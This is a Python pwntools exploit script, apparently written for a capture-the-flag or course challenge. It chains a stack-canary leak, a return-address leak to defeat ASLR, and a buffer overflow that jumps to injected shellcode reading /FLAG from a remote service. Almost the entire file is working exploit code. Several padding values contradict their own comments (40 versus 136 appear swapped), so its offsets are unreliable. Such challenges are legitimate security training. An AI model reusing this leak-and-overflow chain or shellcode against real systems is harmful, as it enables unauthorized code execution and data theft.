#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *
import sys

# --- Configuration ---
OFFSET_RETURN_SITE_FROM_BASE = 0x9cbc # 從 objdump/GDB 分析 bof1/bof2 得到
OFFSET_MSG_FROM_BASE = 0xef220      # 從 objdump/GDB 分析 bof1/bof2 得到

context.arch = 'amd64'
context.os = 'linux'
context.endian = "little"
# context.log_level = 'debug' # 取消註解以獲得更詳細的 pwntools 日誌

# 75 位元組的 shellcode (open/read/write /FLAG)
shellcode_assembly = """
    jmp short string_data_marker
code_logic_marker:
    pop rbp
    mov rdi, rbp
    xor rsi, rsi
    xor rdx, rdx
    push 2
    pop rax
    syscall

    mov rdi, rax
    lea rsi, [rbp + 6]
    push 25
    pop rdx

read_loop:
    push 0
    pop rax
    syscall

    test rax, rax
    jle short exit_sequence

    push rdi
    push rsi
    push rdx

    mov rdx, rax
    push 1
    pop rdi

    push 1
    pop rax
    syscall

    pop rdx
    pop rsi
    pop rdi

    jmp short read_loop

exit_sequence:
    xor rdi, rdi
    push 60
    pop rax
    syscall

string_data_marker:
    call code_logic_marker
    .asciz "/FLAG"
"""

try:
    shellcode = asm(shellcode_assembly)
    log.info(f"Assembled shellcode length: {len(shellcode)} bytes")
except PwnlibException as e:
    log.error(f"Error assembling shellcode: {e}")
    sys.exit(1)

# --- Connection ---
r = remote('up.zoolab.org', 12343) # Challenge 3 port

leaked_canary = 0
leaked_ret_addr = 0
executable_base = 0
address_of_msg = 0

try:
    # --- Stage 1: Leak Canary using buf1's printf ---
    # buf1 at rbp-0x90. We want printf to read past buf1, buf2, buf3 to reach canary.
    # The content of buf1, buf2, buf3 will be our 'A's.
    # Distance from buf1 start (rbp-0x90) to canary start (rbp-0x8) is 0x88 = 136 bytes.
    # We send 136 'A's. printf("%s", buf1) will print these 'A's,
    # then hit the canary's LSB (0x00) and stop, but before that,
    # it should have printed the 7 MSBs of the canary.
    
    padding_to_canary_lsb_from_buf1 = 40
    payload_s1_leak_canary = b'A' * padding_to_canary_lsb_from_buf1
    
    r.recvuntil(b"What's your name? ")
    log.info(f"Stage 1: Sending {len(payload_s1_leak_canary)} 'A's to buf1 to leak canary (no newline)...")
    r.send(payload_s1_leak_canary) 

    output_s1 = r.recvuntil(b"\nWhat's the room number? ", timeout=5.0)
    log.info("--- Debugging Canary Leak (Stage 1 Output) ---")
    log.info(f"Raw output: {repr(output_s1)}")
    
    try:
        welcome_prefix = b"Welcome, "
        # Find where our 'A's (payload_s1_leak_canary) end in the output
        idx_after_welcome = output_s1.index(welcome_prefix) + len(welcome_prefix)
        if not output_s1[idx_after_welcome:].startswith(payload_s1_leak_canary):
            raise PwnlibException("Canary leak: Payload 'A's not found after 'Welcome, '")
        
        canary_material_start_idx = idx_after_welcome + len(payload_s1_leak_canary)
        # Extract bytes between end of our 'A's and start of next known prompt "\nWhat's..."
        next_prompt_start_idx = output_s1.index(b"\nWhat's the room number? ", canary_material_start_idx)
        leaked_canary_high_bytes = output_s1[canary_material_start_idx:next_prompt_start_idx]
        
        log.info(f"Bytes visibly leaked for canary (len {len(leaked_canary_high_bytes)}): {leaked_canary_high_bytes.hex()}")

        if len(leaked_canary_high_bytes) == 7: # Canary LSB is \x00, printf prints 7 MSBs
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes)
            log.success(f"Reconstructed canary: {hex(leaked_canary)}")
        # Based on your last log for canary, it might be 6 bytes + LSB=00 + MSB=00
        elif len(leaked_canary_high_bytes) == 6:
            log.warning("Only 6 bytes of canary material found. Assuming LSB=00 and MSB also 00 for canary.")
            leaked_canary = u64(b'\x00' + leaked_canary_high_bytes + b'\x00')
            log.success(f"Reconstructed canary (LSB=00 + 6B + MSB=00): {hex(leaked_canary)}")
        else:
            log.error(f"Unexpected length for canary material: {len(leaked_canary_high_bytes)}. Check GDB for actual canary structure if different from LSB=00 + 7 MSB.")
            raise PwnlibException("Canary material length error")
            
    except Exception as e:
        log.error(f"Error parsing canary leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 2: Leak Return Address using buf2's printf ---
    # buf2 at rbp-0x60. Return address at rbp+8.
    # Padding to fill buf2, buf3, canary, saved_rbp = (rbp+8) - (rbp-0x60) = 0x68 = 104 bytes.
    padding_to_ret_addr_from_buf2 = 104
    payload_s2_leak_retaddr = b'B' * padding_to_ret_addr_from_buf2
    
    log.info(f"Stage 2: Sending {len(payload_s2_leak_retaddr)} 'B's to buf2 to leak return address (no newline)...")
    # The prompt "\nWhat's the room number? " was consumed by previous recvuntil.
    r.send(payload_s2_leak_retaddr)

    output_s2 = r.recvuntil(b"\nWhat's the customer's name? ", timeout=5.0)
    log.info("--- Debugging Return Address Leak (Stage 2 Output) ---")
    log.info(f"Raw output: {repr(output_s2)}")

    try:
        room_num_prefix = b"The room number is: "
        idx_after_room_prefix = output_s2.index(room_num_prefix) + len(room_num_prefix)
        if not output_s2[idx_after_room_prefix:].startswith(payload_s2_leak_retaddr):
            raise PwnlibException("RetAddr leak: Payload 'B's not found")

        ret_addr_material_start_idx = idx_after_room_prefix + len(payload_s2_leak_retaddr)
        next_prompt_start_idx_ret = output_s2.index(b"\nWhat's the customer's name? ", ret_addr_material_start_idx)
        leaked_ret_addr_low_bytes = output_s2[ret_addr_material_start_idx:next_prompt_start_idx_ret]

        log.info(f"Bytes visibly leaked for ret_addr (len {len(leaked_ret_addr_low_bytes)}): {leaked_ret_addr_low_bytes.hex()}")

        if len(leaked_ret_addr_low_bytes) == 6: # GDB showed 0000xxxxxxxxXXXX for ret addr
            leaked_ret_addr = u64(leaked_ret_addr_low_bytes + b"\x00\x00") # Pad MSBs with 00
            log.success(f"Constructed ret_addr (6 leaked LSBs + MSBs 0000): {hex(leaked_ret_addr)}")
        # Based on your Challenge 2 success, this might be the case.
        # If GDB showed ret_addr was 0x00007ffff7f13cbc, then its 7th byte is 00.
        # If printf prints byte 1 to 6, then stops at byte 7 (00), then we get 6 bytes.
        else:
            log.error(f"Expected 6 LSBs for ret_addr, got {len(leaked_ret_addr_low_bytes)}. RetAddr leak failed or parsing error.")
            raise PwnlibException("RetAddr leak insufficient/unexpected bytes")
            
        executable_base = leaked_ret_addr - OFFSET_RETURN_SITE_FROM_BASE
        log.success(f"Calculated executable base: {hex(executable_base)}")
        address_of_msg = executable_base + OFFSET_MSG_FROM_BASE
        log.success(f"Calculated address of msg buffer: {hex(address_of_msg)}")

    except Exception as e:
        log.error(f"Error parsing return address leak: {e}")
        r.interactive(); sys.exit(1)

    # --- Stage 3: Overflow buf3 with Canary and Jump to Shellcode ---
    # buf3 at rbp-0x30. Canary at rbp-0x8. Saved RBP at rbp. RetAddr at rbp+8.
    # Padding from buf3 start to canary = (rbp-0x8) - (rbp-0x30) = 0x28 = 40 bytes.
    padding_buf3_to_canary = 136
    junk_rbp = p64(0x4444400044444444) # 'D'*8, ensure LSB is not null for next p64
    
    final_payload = b'C' * padding_buf3_to_canary
    final_payload += p64(leaked_canary)
    final_payload += junk_rbp  # Overwrite saved RBP
    final_payload += p64(address_of_msg) # Target RIP
    
    log.info(f"Sending final overflow payload ({len(final_payload)} bytes) to buf3...")
    # The prompt "\nWhat's the customer's name? " was consumed by previous recvuntil.
    r.sendline(final_payload) # sendline adds newline

    # --- Stage 4: Send Shellcode into msg buffer ---
    r.recvuntil(b"Leave your message: ")
    log.info("Sending shellcode into msg buffer...")
    r.send(shellcode) 
    
    # --- Stage 5: Get Flag ---
    log.success("Payloads sent. Shellcode should execute when task() returns.")
    log.success("Attempting to receive flag output...")
    flag_output = r.recvall(timeout=4.0) # Increased timeout slightly
    log.success("--- FLAG ---")
    if flag_output:
        try:
            decoded_flag = flag_output.decode(errors='ignore').strip()
            print(decoded_flag)
        except:
            print(repr(flag_output))
    else:
        log.warning("No flag output received.")
    log.success("--------------")

except PwnlibException as e:
    log.critical(f"A PwnlibException occurred: {e}")
except Exception as e:
    log.critical(f"An unexpected Python error occurred: {e}")
    import traceback
    traceback.print_exc()
    if 'r' in locals() and r.connected():
        log.info("Dropping to interactive...")
        try: r.interactive()
        except: pass
finally:
    if 'r' in locals() and r.connected():
        r.close()